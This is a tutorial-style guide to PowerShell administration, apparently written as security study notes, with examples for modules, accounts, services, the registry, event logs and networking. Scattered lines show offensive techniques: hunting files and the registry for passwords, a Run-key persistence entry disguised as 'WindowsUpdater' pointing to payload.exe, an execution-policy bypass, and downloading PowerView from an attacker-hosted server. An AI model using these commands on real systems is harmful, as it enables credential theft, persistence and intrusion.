# PowerShell

PowerShell is a Windows command-line shell and scripting language built around automation, administration, and object-based data handling. Unlike CMD, which mainly works with text output, PowerShell works with structured objects. This makes it powerful for system management, security auditing, incident response, and automation.

---

## Cmdlets and Modules

PowerShell's power comes from its modular design. Standard commands provide basic functionality, while cmdlets and modules expand PowerShell into a specialized tool for system administration, Active Directory management, cloud automation, and security operations.

### Cmdlets

A **cmdlet** is a lightweight PowerShell command that performs a specific task.

Cmdlets follow a consistent **Verb-Noun** naming pattern:

```powershell
Get-Help
Stop-Service
New-Item
Remove-Item
```

| Component | Description | Example |
|---|---|---|
| Verb | The action being performed | `Get`, `Set`, `New`, `Remove` |
| Noun | The object being acted on | `Service`, `Process`, `Content`, `ADUser` |

Cmdlets are typically compiled commands, while PowerShell functions are usually written directly in PowerShell script.

---

## PowerShell Modules

A **module** is a package that groups related cmdlets, functions, scripts, and resources.

| Extension | Name | Purpose |
|---|---|---|
| `.psd1` | Manifest | Stores metadata such as author, version, and dependencies |
| `.psm1` | Script Module | Contains PowerShell functions and logic |
| `.dll` | Assembly | Contains compiled cmdlets |

### Finding and Loading Modules

```powershell
# List available modules
Get-Module -ListAvailable

# Import a module into the current session
Import-Module .\PowerSploit.psd1

# Show module search paths
$env:PSModulePath
```

### PowerShell Gallery

The **PowerShell Gallery** is a public repository for PowerShell modules and scripts.

```powershell
# Search for a module
Find-Module -Name AdminToolbox

# Install a module
Install-Module -Name AdminToolbox

# Import an installed module
Import-Module AdminToolbox
```

### Useful Security and Admin Modules

| Module | Use Case |
|---|---|
| PowerSploit | Penetration testing and post-exploitation tooling |
| ActiveDirectory | Managing Active Directory users, groups, and computers |
| BloodHound | Mapping Active Directory attack paths |
| Inveigh | Network spoofing and man-in-the-middle testing |
| AdminToolbox | General Windows administration utilities |

---

## Execution Policy

PowerShell's **Execution Policy** helps prevent accidental execution of untrusted scripts. It is a safety feature, not a true security boundary.

| Policy | Description |
|---|---|
| Restricted | No scripts can run |
| RemoteSigned | Local scripts can run; downloaded scripts must be signed |
| Unrestricted | Scripts can run, but downloaded scripts may prompt |
| Bypass | Nothing is blocked and no prompts appear |

To temporarily bypass the execution policy for the current PowerShell process:

```powershell
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
```

This does not permanently change the system-wide policy.

---

## User and Group Management

PowerShell can manage both local Windows accounts and domain accounts in Active Directory environments.

### Account Types

| Account Type | Scope | Usage |
|---|---|---|
| Local User | Single host | Used only on one computer |
| Domain User | Entire domain | Centrally managed through Active Directory |
| Service Account | Application or service | Used by applications and background services |
| Built-in Account | System-defined | Default accounts such as Administrator and Guest |

---

## Local User and Group Management

Local user management uses cmdlets from the `Microsoft.PowerShell.LocalAccounts` module.

### Listing and Creating Local Users

```powershell
# List local users
Get-LocalUser

# Create a local user without a password
New-LocalUser -Name "JLawrence" -NoPassword

# Modify an existing local user
Set-LocalUser -Name "JLawrence" -Description "Local test account"
```

### Managing Local Groups

```powershell
# List local groups
Get-LocalGroup

# Add a user to the local Administrators group
Add-LocalGroupMember -Group "Administrators" -Member "JLawrence"

# View local Administrators
Get-LocalGroupMember -Group "Administrators"
```

From a security perspective, local group membership is important because groups such as **Administrators**, **Remote Desktop Users**, and **Remote Management Users** can provide powerful access.

---

## Active Directory Management with PowerShell

In enterprise Windows environments, accounts are often managed through Active Directory. To manage AD from PowerShell, the Active Directory module must be installed through RSAT.

### Installing Active Directory Tools

```powershell
Get-WindowsCapability -Name RSAT* -Online | Add-WindowsCapability -Online
```

### Common Active Directory Cmdlets

| Action | Cmdlet | Example |
|---|---|---|
| Search users | `Get-ADUser` | `Get-ADUser -Identity TSilver` |
| Create users | `New-ADUser` | `New-ADUser -Name "MTanaka" -Enabled $true` |
| Modify users | `Set-ADUser` | `Set-ADUser -Identity MTanaka -Description "Security Sensei"` |

### Bulk User Audit

```powershell
# Find disabled AD users
Get-ADUser -Filter 'Enabled -eq $false' | Select-Object Name, SamAccountName
```

For defenders, these commands help audit user accounts. For attackers, the same commands may be abused for reconnaissance, privilege discovery, or persistence.

---

## Files and Directories

PowerShell provides object-based file and directory management. Many cmdlets also have aliases that resemble CMD or Linux commands.

| Cmdlet | Alias | Purpose |
|---|---|---|
| `Get-ChildItem` | `gci`, `ls`, `dir` | Lists files and directories |
| `New-Item` | `ni`, `mkdir` | Creates a file or directory |
| `Remove-Item` | `rm`, `del` | Deletes a file or directory |
| `Rename-Item` | `ren` | Renames an item |
| `Copy-Item` | `cp`, `copy` | Copies an item |
| `Get-Content` | `cat`, `type` | Reads file content |
| `Add-Content` | `ac` | Appends content to a file |

### Creating Directories and Files

```powershell
# Create a parent directory
New-Item -Name "SOPs" -ItemType Directory

# Create nested folders
mkdir "SOPs\Cyber Sec", "SOPs\Physical Sec", "SOPs\Training"

# Create a file
New-Item -Path ".\SOPs\Readme.md" -ItemType File

# Add content to the file
Add-Content .\SOPs\Readme.md "Title: SOP Index"
Add-Content .\SOPs\Readme.md "Date: $(Get-Date)"
Add-Content .\SOPs\Readme.md "Author: MTanaka"
```

### Bulk Renaming

```powershell
# Rename all .txt files in the current directory to .md
Get-ChildItem -Path *.txt | Rename-Item -NewName { $_.Name -replace '\.txt$', '.md' }
```

In the pipeline, `$_` represents the current object being processed.

---

## File and Directory Permissions

Windows file permissions are usually controlled through NTFS access control lists.

| Permission | Capability |
|---|---|
| Full Control | Modify, delete, change permissions, and take ownership |
| Modify | Read, write, and delete |
| Read & Execute | View contents and run scripts or binaries |
| Write | Create files and folders |
| Read | View files and list folder contents |

By default, child files and directories inherit permissions from their parent folder. Inheritance can be disabled for sensitive folders that need stricter access control.

### Searching for Sensitive Files

```powershell
# Search C:\ for files with "password" in the name
Get-ChildItem -Path C:\ -Filter "*password*" -Recurse -ErrorAction SilentlyContinue
```

---

## Objects and the Pipeline

PowerShell treats command output as objects, not plain text. Objects have properties and methods.

| Concept | Description |
|---|---|
| Class | The blueprint for an object |
| Property | Data stored on the object |
| Method | An action the object can perform |

### Inspecting Object Members

```powershell
Get-LocalUser Administrator | Get-Member
```

### Selecting Properties

```powershell
# Show only selected properties
Get-LocalUser * | Select-Object Name, LastLogon
```

### Filtering Objects

```powershell
# Find running Defender-related services
Get-Service | Where-Object {
    $_.DisplayName -like "*Defender*" -and $_.Status -eq "Running"
}
```

### Common Comparison Operators

| Operator | Meaning |
|---|---|
| `-like` | Wildcard match |
| `-eq` | Exact match |
| `-match` | Regular expression match |
| `-gt` | Greater than |
| `-lt` | Less than |

---

## Pipeline Chain Operators

PowerShell 7 introduced chain operators similar to other shells.

| Operator | Meaning |
|---|---|
| `&&` | Run the next command only if the previous command succeeds |
| `||` | Run the next command only if the previous command fails |

```powershell
# If creds.txt exists and can be read, ping 8.8.8.8
Get-Content .\creds.txt && ping 8.8.8.8
```

---

## Content Discovery with Select-String

`Select-String` is the PowerShell equivalent of `grep`. It searches text patterns inside files.

```powershell
# Search all .txt and .ps1 files under C:\Users for sensitive keywords
Get-ChildItem -Path C:\Users\ -Include *.txt,*.ps1 -Recurse -File -ErrorAction SilentlyContinue |
    Select-String -Pattern "Password", "Secret"
```

### High-Value Forensic Targets

| Target | Command or Path |
|---|---|
| PowerShell history | `(Get-PSReadlineOption).HistorySavePath` |
| Clipboard | `Get-Clipboard` |
| AppData configs | `C:\Users\<User>\AppData\Roaming\` |
| Hidden files | `Get-ChildItem -Hidden -Recurse` |
| Scheduled tasks | `Get-ScheduledTask` |

If a command produces too many access denied errors, add:

```powershell
-ErrorAction SilentlyContinue
```

---

## Service Management

Services are background processes that support operating system and application functionality. In incident response, service management is useful for checking whether important services were stopped, disabled, or modified.

### Listing Services

```powershell
# List services with display names and status
Get-Service | Format-Table DisplayName, Status
```

### Finding Security Services

```powershell
# Hunt for Defender-related services
Get-Service |
    Where-Object { $_.DisplayName -like "*Defender*" } |
    Select-Object DisplayName, Status
```

### Starting, Stopping, and Restarting Services

| Action | Cmdlet | Use Case |
|---|---|---|
| Start | `Start-Service` | Start a stopped service |
| Stop | `Stop-Service` | Stop a running service |
| Restart | `Restart-Service` | Restart a service to refresh it |

```powershell
# Start Windows Defender
Start-Service -Name WinDefend

# Restart the Print Spooler
Restart-Service -Name Spooler
```

### Changing Startup Type

```powershell
# Disable a service
Set-Service -Name Spooler -StartupType Disabled

# Ensure Defender starts automatically
Set-Service -Name WinDefend -StartupType Automatic
```

Attackers may disable security services to weaken a host. Defenders should monitor for unauthorized changes to critical services.

---

## Remote Service Management

PowerShell can manage services on remote systems when permissions and remoting are configured correctly.

### Using `-ComputerName`

```powershell
# Query running services on a remote host
Get-Service -ComputerName ACADEMY-DC01 |
    Where-Object { $_.Status -eq "Running" }
```

### Using Invoke-Command

```powershell
# Check Defender status on multiple hosts
Invoke-Command -ComputerName WS01, WS02, DC01 -ScriptBlock {
    Get-Service WinDefend
}
```

`Invoke-Command` is useful when performing the same administrative action across many hosts.

---

## Windows Registry

The **Windows Registry** is a hierarchical database that stores configuration for the operating system, hardware, users, and applications. It is also a common location for attacker persistence and accidental credential exposure.

### Registry Structure

| Component | Description |
|---|---|
| Key | Container similar to a folder |
| Value | Data stored inside a key |
| Hive | A major registry root section |

### Common Registry Hives

| Hive | Abbreviation | Description |
|---|---|---|
| HKEY_LOCAL_MACHINE | HKLM | System-wide settings |
| HKEY_CURRENT_USER | HKCU | Current user settings |
| HKEY_USERS | HKU | Loaded user profiles |
| HKEY_CLASSES_ROOT | HKCR | File associations and COM data |
| HKEY_CURRENT_CONFIG | HKCC | Current hardware profile |

---

## Querying the Registry

### PowerShell Method

PowerShell treats registry hives like drives.

```powershell
# List programs configured to run at startup for the machine
Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
```

### reg.exe Method

```cmd
reg query HKEY_LOCAL_MACHINE\SOFTWARE\7-Zip
```

---

## Hunting for Registry Secrets

```cmd
REG QUERY HKCU /F "Password" /t REG_SZ /S /K
```

| Switch | Meaning |
|---|---|
| `/F "Password"` | Search for the string `Password` |
| `/t REG_SZ` | Search string values |
| `/S` | Search recursively |
| `/K` | Search key names |

---

## Registry Persistence

Attackers commonly use **Run** and **RunOnce** keys to execute malware when a user logs in.

| Key | Scope |
|---|---|
| `HKLM\Software\Microsoft\Windows\CurrentVersion\Run` | Runs for every user; requires admin rights |
| `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` | Runs for the current user |
| `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce` | Runs once, then removes itself |

### Creating a Run Key with PowerShell

```powershell
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
    -Name "WindowsUpdater" `
    -PropertyType String `
    -Value "C:\Users\Public\payload.exe"
```

### Creating a Run Key with reg.exe

```cmd
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdater /t REG_SZ /d "C:\Users\Public\payload.exe"
```

### Common Registry Value Types

| Type | Description |
|---|---|
| REG_SZ | Standard string |
| REG_EXPAND_SZ | String that can contain environment variables |
| REG_DWORD | 32-bit number |
| REG_BINARY | Raw binary data |

---

## Windows Event Log Analysis

The Windows Event Log records system, application, and security events. It is one of the most important data sources for troubleshooting and incident response.

### Event Log Storage

Windows Event Logs are stored as `.evtx` files in:

```text
C:\Windows\System32\winevt\logs
```

### Main Event Log Categories

| Log Name | Description |
|---|---|
| System | OS component events such as drivers and service changes |
| Security | Logons, privilege use, and audit events |
| Application | Events from installed applications |
| Setup | Installation and update events |
| Forwarded Events | Events collected from other computers |

### Event Severity Levels

| Level | Type | Description |
|---|---|---|
| 1 | Critical | System or application failure |
| 2 | Error | Significant problem |
| 3 | Warning | Potential problem |
| 4 | Information | Normal successful operation |
| 5 | Verbose | Detailed diagnostic output |

---

## Working with Event Logs Using wevtutil

`wevtutil` is a native command-line tool for querying and exporting Windows Event Logs.

| Action | Command | Description |
|---|---|---|
| Enumerate logs | `wevtutil el` | Lists all log names |
| Get log config | `wevtutil gl <LogName>` | Shows log configuration |
| Query events | `wevtutil qe <LogName> /c:5 /f:text` | Reads events |
| Export log | `wevtutil epl <LogName> <Path.evtx>` | Exports a log |

### Reading Recent Security Events

```cmd
wevtutil qe Security /c:5 /rd:true /f:text
```

| Switch | Meaning |
|---|---|
| `/c:5` | Return 5 events |
| `/rd:true` | Newest events first |
| `/f:text` | Human-readable text output |

---

## Working with Event Logs Using Get-WinEvent

PowerShell provides more flexible event filtering through `Get-WinEvent`.

```powershell
# List all logs
Get-WinEvent -ListLog *

# Read the 5 newest Security events
Get-WinEvent -LogName Security -MaxEvents 5

# Filter by log name and event ID
Get-WinEvent -FilterHashtable @{LogName='System'; ID=7036}
```

### Hunting Failed Logons

Event ID **4625** indicates a failed logon.

```powershell
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4625} |
    Select-Object TimeCreated, ProviderName, Id, Message
```

Multiple failed logons in a short period may indicate brute force activity, password spraying, or misconfigured services.

---

## Windows Networking with PowerShell

PowerShell includes cmdlets for viewing and managing TCP/IP configuration.

### Legacy Commands vs. PowerShell Cmdlets

| Action | Legacy Command | PowerShell Cmdlet |
|---|---|---|
| View IP config | `ipconfig /all` | `Get-NetIPAddress` |
| View interfaces | `netsh interface show interface` | `Get-NetIPInterface` |
| Check connectivity | `ping <host>` | `Test-NetConnection` |
| View ARP table | `arp -a` | `Get-NetNeighbor` |
| View route table | `route print` | `Get-NetRoute` |

### Viewing Interfaces

```powershell
# List network interfaces
Get-NetIPInterface | Select-Object ifIndex, InterfaceAlias, AddressFamily

# Get IP details for a specific interface
Get-NetIPAddress -InterfaceIndex 12
```

### Setting a Static IP

```powershell
# Disable DHCP
Set-NetIPInterface -InterfaceIndex 12 -Dhcp Disabled

# Assign a static IP address
New-NetIPAddress -InterfaceIndex 12 `
    -IPAddress 192.168.1.50 `
    -PrefixLength 24 `
    -DefaultGateway 192.168.1.1
```

---

## Remote Management with WinRM

**Windows Remote Management** allows remote PowerShell administration. It commonly uses:

| Protocol | Port |
|---|---|
| WinRM over HTTP | 5985 |
| WinRM over HTTPS | 5986 |

### Quick Configuration

```powershell
winrm quickconfig
```

This starts the WinRM service, sets it to automatic, creates a listener, and adds a firewall exception.

### Testing and Connecting

```powershell
# Test WinRM connectivity
Test-WSMan -ComputerName "10.10.10.5"

# Start an interactive remote PowerShell session
Enter-PSSession -ComputerName "10.10.10.5" -Credential (Get-Credential)
```

---

## OpenSSH on Windows

Modern Windows systems can run OpenSSH Server, allowing remote access with standard SSH clients.

### Installing and Starting SSH

```powershell
# Install OpenSSH Server
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0

# Start SSH service
Start-Service sshd

# Set SSH to start automatically
Set-Service -Name sshd -StartupType Automatic
```

### Connecting to Windows over SSH

```bash
ssh username@<Windows_IP>
```

By default, SSH on Windows may open a CMD shell. You can type `powershell` to switch into PowerShell.

---

## Connectivity Diagnostics

`Test-NetConnection` is a powerful connectivity testing cmdlet.

```powershell
# Basic connectivity test
Test-NetConnection 8.8.8.8

# Test a specific TCP port
Test-NetConnection -ComputerName 192.168.1.50 -Port 445

# Trace the route
Test-NetConnection 8.8.8.8 -TraceRoute
```

---

## Web Requests with PowerShell

PowerShell can interact with websites, APIs, and remote files using `Invoke-WebRequest`.

### Invoke-WebRequest

```powershell
# Send a GET request
$response = Invoke-WebRequest -Uri "https://www.example.com" -Method GET

# View links
$response.Links

# View images
$response.Images

# View raw content
$response.RawContent
```

Common aliases include:

```powershell
iwr
wget
curl
```

In Windows PowerShell, `curl` and `wget` are aliases for `Invoke-WebRequest`, not always the native Linux tools.

---

## Downloading Files

```powershell
Invoke-WebRequest -Uri "http://10.10.14.5/tool.exe" -OutFile "C:\Temp\tool.exe"
```

A common transfer workflow is:

```bash
# Attacker machine: host files
python3 -m http.server 8000
```

```powershell
# Windows target: download file
Invoke-WebRequest -Uri "http://<Attacker_IP>:8000/PowerView.ps1" -OutFile "C:\Users\Public\PowerView.ps1"
```

---

## .NET WebClient Fallback

If `Invoke-WebRequest` is unavailable, restricted, or too slow, PowerShell can use the .NET `WebClient` class.

```powershell
(New-Object Net.WebClient).DownloadFile(
    "http://10.10.14.5/tool.zip",
    "C:\Temp\tool.zip"
)
```

| Method | Best For |
|---|---|
| `Invoke-WebRequest` | General web requests, scraping, and API interaction |
| `Invoke-WebRequest -OutFile` | Downloading files to disk |
| `Net.WebClient` | Legacy systems or faster file downloads |
| `-UseBasicParsing` | Compatibility on systems without Internet Explorer components |

---

## PowerShell Scripting and Modules

PowerShell scripts and modules allow administrators and security professionals to automate repetitive tasks.

| Extension | Type | Description |
|---|---|---|
| `.ps1` | Script | Executable PowerShell script |
| `.psm1` | Module | Contains functions and reusable logic |
| `.psd1` | Manifest | Describes module metadata |

---

## Building a Simple Module

### Create the Module Directory

```powershell
mkdir quick-recon
```

### Create a Module Manifest

```powershell
New-ModuleManifest -Path .\quick-recon\quick-recon.psd1 -PassThru
```

### Create the Script Module

```powershell
New-Item .\quick-recon\quick-recon.psm1 -ItemType File
```

---

## Writing a Function

PowerShell automation usually wraps reusable logic inside functions.

```powershell
function Get-Recon {
    $Hostname = $env:ComputerName
    $IP = ipconfig
    $Users = Get-ChildItem C:\Users\

    New-Item ~\Desktop\recon.txt -ItemType File -Force

    $Output = "---Host---", $Hostname, "---IP---", $IP, "---Users---", $Users
    Add-Content ~\Desktop\recon.txt $Output
}
```

---

## Comment-Based Help

PowerShell functions can include built-in help comments.

```powershell
<#
.Description
    Performs simple reconnaissance on the local host.
.Example
    Get-Recon
#>
function Get-Recon {
    $Hostname = $env:ComputerName
    $Users = Get-ChildItem C:\Users\

    New-Item ~\Desktop\recon.txt -ItemType File -Force
    Add-Content ~\Desktop\recon.txt $Hostname
    Add-Content ~\Desktop\recon.txt $Users
}
```

Users can then run:

```powershell
Get-Help Get-Recon
```

---

## Exporting Module Functions

Use `Export-ModuleMember` to control which functions are visible when the module is imported.

```powershell
Export-ModuleMember -Function Get-Recon
```

---

## Example Module Code

```powershell
<#
.Description
    Performs simple recon tasks and outputs them to recon.txt on the Desktop.
.Example
    Get-Recon
#>
function Get-Recon {
    $Hostname = $env:ComputerName
    $IP = ipconfig
    $Users = Get-ChildItem C:\Users\

    New-Item ~\Desktop\recon.txt -ItemType File -Force

    $Output = "---Host---", $Hostname, "---IP---", $IP, "---Users---", $Users
    Add-Content ~\Desktop\recon.txt $Output
}

Export-ModuleMember -Function Get-Recon
```

### Loading and Running the Module

```powershell
# Import the module
Import-Module 'C:\Users\MTanaka\Documents\WindowsPowerShell\Modules\quick-recon'

# Verify it loaded
Get-Module quick-recon

# Run the function
Get-Recon
```

---

## Cheat Sheet

| Task | Command |
|---|---|
| List available modules | `Get-Module -ListAvailable` |
| Import a module | `Import-Module <Path>` |
| Temporarily bypass execution policy | `Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass` |
| List local users | `Get-LocalUser` |
| List local groups | `Get-LocalGroup` |
| Add user to local group | `Add-LocalGroupMember` |
| Search AD user | `Get-ADUser -Identity <User>` |
| List files | `Get-ChildItem` |
| Search file contents | `Select-String` |
| List services | `Get-Service` |
| Start service | `Start-Service` |
| Change service startup | `Set-Service` |
| Query registry | `Get-ItemProperty` |
| Read event logs | `Get-WinEvent` |
| Test port connectivity | `Test-NetConnection -Port <Port>` |
| Download file | `Invoke-WebRequest -OutFile <Path>` |
| Run remote command | `Invoke-Command` |